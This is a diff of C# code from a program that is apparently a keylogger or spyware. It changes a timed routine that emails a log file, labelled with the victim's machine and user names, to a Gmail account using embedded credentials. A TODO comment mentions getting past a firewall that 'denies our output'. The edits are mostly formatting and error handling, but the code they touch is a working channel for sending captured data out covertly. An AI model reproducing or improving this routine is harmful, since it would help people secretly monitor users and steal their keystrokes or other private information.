@@ -176,6 +176,8 @@ namespace WindowsFormsApplication1
 
         public static void OnTimedEvent(object source, EventArgs e)
         {
+            // TODO: This section needs to be reworked to test for a situation where the firewall denies our output.
+            
             // If there's nothing to send.... don't do it
             if (new FileInfo(path).Length == 0)
             {
@@ -196,16 +198,17 @@ namespace WindowsFormsApplication1
             // Future versions will be configurable to use other email providers and not rely on google
             const string emailAddress = Password.username;
             const string emailPassword = Password.password;
+
             System.Net.Mail.MailMessage msg = new System.Net.Mail.MailMessage(); //create the message
             msg.To.Add(emailAddress);
             msg.From = new MailAddress(emailAddress, emailAddress, System.Text.Encoding.UTF8);
-
             msg.Subject = "LOG [Computer:" + Environment.MachineName + "] [Username:" + Environment.UserName + "]";
             msg.SubjectEncoding = System.Text.Encoding.UTF8;
             msg.Body = "Please view the attachment for details";
             msg.BodyEncoding = System.Text.Encoding.UTF8;
             msg.IsBodyHtml = false;
             msg.Priority = MailPriority.High;
+
             SmtpClient client = new SmtpClient(); 
             //Network Credentials for Gmail            
             client.Credentials = new System.Net.NetworkCredential(emailAddress, emailPassword);
@@ -214,16 +217,19 @@ namespace WindowsFormsApplication1
             client.EnableSsl = true;
             Attachment data = new Attachment(Program.path);
             msg.Attachments.Add(data);
+
             try
             {
                 client.Send(msg);
                 failed = 0;
             }
-            catch
+            catch (Exception f)
             {
                 data.Dispose();
                 failed = 1;
+                throw new Exception("Mail.Send: " + f.Message);                
             }
+
             data.Dispose();
 
             if (failed == 0)
